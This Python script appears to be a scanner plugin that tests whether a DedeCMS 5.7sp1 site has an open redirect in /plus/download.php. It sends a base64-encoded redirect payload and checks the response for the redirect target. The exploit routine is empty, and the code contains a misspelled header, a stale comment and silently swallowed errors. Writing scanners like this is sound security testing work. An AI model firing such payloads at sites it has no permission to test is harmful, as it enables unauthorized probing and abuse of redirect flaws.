# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class dedecms_download_redirct(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'dedecms',
            'vuln_title':'dedecms_download_redirct',
            'vuln_level':3,
            'vuln_type':10,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if r"www.baidu.com" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = dedecms_download_redirct("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)